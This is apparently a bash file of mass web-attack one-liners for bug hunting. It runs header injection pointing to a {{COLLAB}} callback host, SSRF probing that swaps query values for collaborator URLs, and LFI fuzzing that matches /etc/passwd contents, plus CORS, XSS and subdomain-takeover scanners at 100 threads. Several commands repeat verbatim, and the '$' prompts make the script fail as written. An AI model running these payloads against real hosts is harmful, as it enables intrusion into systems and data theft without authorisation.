#!/bin/bash
$ subzy run --targets hosts_alive.txt --concurrency 100 --hide_fails --verify_ssl
$ cat hosts_alive.txt | xargs -I % sh -c 'echo "Scanning: %" && curl -I % -H "Host: {{COLLAB}}" -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"'
$ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"    
$ cat all_urls.txt | grep "=" |uro| qsreplace "https://{{COLLAB}}" | httpx -follow-redirects -cl -sc
$ cat all_urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
$ python ~/Corsy/corsy.py -i hosts_alive.txt -o corsy_results.txt 
$ cat hosts_alive.txt | while read url; do echo -e "\033[1;32m$url\033[0m"; xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: {{COLLAB}}' | grep xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: {{COLLAB}}' | grep xss); xss3=$(curl -s -L "$url" -H 'Host: {{COLLAB}}' | grep xss); xss4=$(curl -s -L "$url" --request-target http://{{COLLAB}}/ --max-time 2); echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"; echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"; echo "Method[3] Host: xss+ssrf => $xss3"; echo "Method[4] GET request-target => $xss4"; done
$ python ~/aceos-tools/host-injector.py -list hosts_alive.txt -threads 100 -collab {{COLLAB}}
$ python3 ~/SSRF-Scanner/ssrf_scanner.py -f ssrf_urls.txt -b {{COLLAB}}
$ cat hosts_alive.txt | xargs -I % sh -c 'echo "Scanning: %" && curl -I % -H "Host: {{COLLAB}}" -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"'
$ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"    
$ cat all_urls.txt | grep "=" | qsreplace "https://{{COLLAB}}" | httpx
$ cat all_urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
$ cat hosts_alive.txt | while read url; do echo -e "\033[1;32m$url\033[0m"; xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: {{COLLAB}}' | grep xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: {{COLLAB}}' | grep xss); xss3=$(curl -s -L "$url" -H 'Host: {{COLLAB}}' | grep xss); xss4=$(curl -s -L "$url" --request-target http://{{COLLAB}}/ --max-time 2); echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"; echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"; echo "Method[3] Host: xss+ssrf => $xss3"; echo "Method[4] GET request-target => $xss4"; done
$ sif -d {{TARGET}} | tee sif_out.txt
$ find . -maxdepth 1 -type f -empty -delete